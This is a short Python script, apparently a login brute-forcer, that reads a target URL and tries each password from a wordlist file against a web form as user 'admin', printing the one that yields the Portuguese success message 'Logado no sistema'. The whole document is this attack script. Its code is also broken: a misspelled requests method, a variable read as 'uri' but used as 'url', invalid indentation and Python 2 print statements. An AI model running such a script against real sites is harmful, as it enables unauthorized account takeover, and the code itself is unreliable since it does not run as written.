import requests
uri = input()
arq = open("big.txt", "r").readlines()

for line in arq:
	passwd = line.strip()
	http = requests.poat(url, data={'input1':'admin', 'input2':passwd, 'sub':'submit'})
	content = http.content
		if "Logado no sistema" in content:
			print 'paddword is -> '+passwd
			break
		else:
			print "passwd invalid: " + passwd